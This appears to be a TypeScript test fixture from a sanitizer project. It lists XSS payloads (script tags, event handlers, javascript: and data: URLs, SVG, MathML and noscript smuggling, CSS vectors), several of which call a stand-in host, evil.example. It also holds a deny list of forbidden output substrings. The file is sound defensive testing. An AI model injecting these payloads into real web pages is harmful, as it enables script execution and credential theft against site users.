/**
 * The XSS corpus (09 §2).
 *
 * Every payload is run through every sanitization profile; the assertion is that the
 * output contains no script element, no event-handler attribute, no dangerous URL
 * scheme and no CSS that can execute. The security CI job fails the build on any
 * violation.
 *
 * These strings are *data*. They are never rendered outside a sanitizer test, and the
 * sanitization demo page renders only the sanitized result.
 */

export interface XssPayload {
  id: string;
  /** The vector this payload exercises. */
  vector: string;
  html: string;
}

export const XSS_PAYLOADS: XssPayload[] = [
  { id: 'script-inline', vector: 'script element', html: '<script>alert(1)</script>' },
  {
    id: 'script-nested-in-p',
    vector: 'script element inside allowed markup',
    html: '<p>ok<script>alert(1)</script></p>',
  },
  {
    id: 'script-src',
    vector: 'external script',
    html: '<script src="https://evil.example/x.js"></script>',
  },
  {
    id: 'img-onerror',
    vector: 'event handler attribute',
    html: '<img src="x" onerror="alert(1)">',
  },
  {
    id: 'img-onerror-uppercase',
    vector: 'event handler with mixed case',
    html: '<IMG SRC="x" OnErRoR="alert(1)">',
  },
  {
    id: 'body-onload',
    vector: 'event handler on a stripped element',
    html: '<body onload="alert(1)"><p>hi</p></body>',
  },
  {
    id: 'svg-onload',
    vector: 'SVG event handler',
    html: '<svg onload="alert(1)"></svg>',
  },
  {
    id: 'svg-script',
    vector: 'script inside SVG',
    html: '<svg><script>alert(1)</script></svg>',
  },
  {
    id: 'svg-use-xlink',
    vector: 'SVG use element',
    html: '<svg><use xlink:href="data:image/svg+xml;base64,PHN2Zz48L3N2Zz4="></use></svg>',
  },
  {
    id: 'svg-foreignobject',
    vector: 'SVG foreignObject smuggling HTML',
    html: '<svg><foreignObject><iframe src="javascript:alert(1)"></iframe></foreignObject></svg>',
  },
  {
    id: 'a-javascript',
    vector: 'javascript: URL',
    html: '<a href="javascript:alert(1)">click</a>',
  },
  {
    id: 'a-javascript-obfuscated',
    vector: 'javascript: with entities and whitespace',
    html: '<a href="jav&#x09;ascript:alert(1)">click</a>',
  },
  {
    id: 'a-javascript-newline',
    vector: 'javascript: split by a newline',
    html: '<a href="java\nscript:alert(1)">click</a>',
  },
  {
    id: 'a-vbscript',
    vector: 'vbscript: URL',
    html: '<a href="vbscript:msgbox(1)">click</a>',
  },
  {
    id: 'a-data-html',
    vector: 'data:text/html URL',
    html: '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">click</a>',
  },
  {
    id: 'img-data-svg',
    vector: 'data: SVG image that can run script',
    html: '<img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9ImFsZXJ0KDEpIj48L3N2Zz4=">',
  },
  {
    id: 'iframe',
    vector: 'iframe element',
    html: '<iframe src="https://evil.example"></iframe>',
  },
  {
    id: 'iframe-srcdoc',
    vector: 'iframe srcdoc',
    html: '<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;"></iframe>',
  },
  { id: 'object', vector: 'object element', html: '<object data="evil.swf"></object>' },
  { id: 'embed', vector: 'embed element', html: '<embed src="evil.swf">' },
  {
    id: 'form-input',
    vector: 'form and input, used for UI redressing',
    html: '<form action="https://evil.example"><input name="password"></form>',
  },
  {
    id: 'style-element',
    vector: 'style element',
    html: '<style>body{background:url(javascript:alert(1))}</style>',
  },
  {
    id: 'style-expression',
    vector: 'CSS expression()',
    html: '<p style="width: expression(alert(1))">x</p>',
  },
  {
    id: 'style-url-javascript',
    vector: 'CSS url(javascript:)',
    html: '<p style="background-image: url(javascript:alert(1))">x</p>',
  },
  {
    id: 'style-import',
    vector: 'CSS @import',
    html: '<p style="@import url(https://evil.example/x.css)">x</p>',
  },
  {
    id: 'style-behavior',
    vector: 'IE behavior property',
    html: '<p style="behavior: url(#default#time2)">x</p>',
  },
  { id: 'link-element', vector: 'link element', html: '<link rel="stylesheet" href="https://evil.example/x.css">' },
  { id: 'meta-refresh', vector: 'meta refresh', html: '<meta http-equiv="refresh" content="0;url=https://evil.example">' },
  { id: 'base-href', vector: 'base element hijacking relative URLs', html: '<base href="https://evil.example/">' },
  {
    id: 'mixed-nested',
    vector: 'nested encodings and broken markup',
    html: '<p><a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">x</a><scr<script>ipt>alert(1)</scr</script>ipt></p>',
  },
  {
    id: 'malformed-unclosed',
    vector: 'unclosed tags with an event handler',
    html: '<div><p onclick="alert(1)">text<div><img src=x onerror=alert(1)>',
  },
  {
    id: 'comment-conditional',
    vector: 'IE conditional comment',
    html: '<!--[if IE]><script>alert(1)</script><![endif]--><p>hi</p>',
  },
  {
    id: 'noscript-smuggle',
    vector: 'noscript smuggling',
    html: '<noscript><p title="</noscript><img src=x onerror=alert(1)>">x</p></noscript>',
  },
  {
    id: 'template-smuggle',
    vector: 'template element smuggling',
    html: '<template><img src=x onerror=alert(1)></template>',
  },
  {
    id: 'math-annotation',
    vector: 'MathML annotation smuggling',
    html: '<math><annotation-xml encoding="text/html"><img src=x onerror=alert(1)></annotation-xml></math>',
  },
  {
    id: 'a-target-noopener',
    vector: 'target=_blank without rel (reverse tabnabbing)',
    html: '<a href="https://example.com" target="_blank">x</a>',
  },
];

/** Substrings that must never appear in sanitized output, in any profile. */
export const FORBIDDEN_IN_OUTPUT = [
  '<script',
  '<iframe',
  '<object',
  '<embed',
  '<form',
  '<input',
  '<style',
  '<link',
  '<meta',
  '<base',
  'javascript:',
  'vbscript:',
  'data:text/html',
  'expression(',
  '@import',
  'behavior:',
  'onerror',
  'onload',
  'onclick',
  'srcdoc',
] as const;
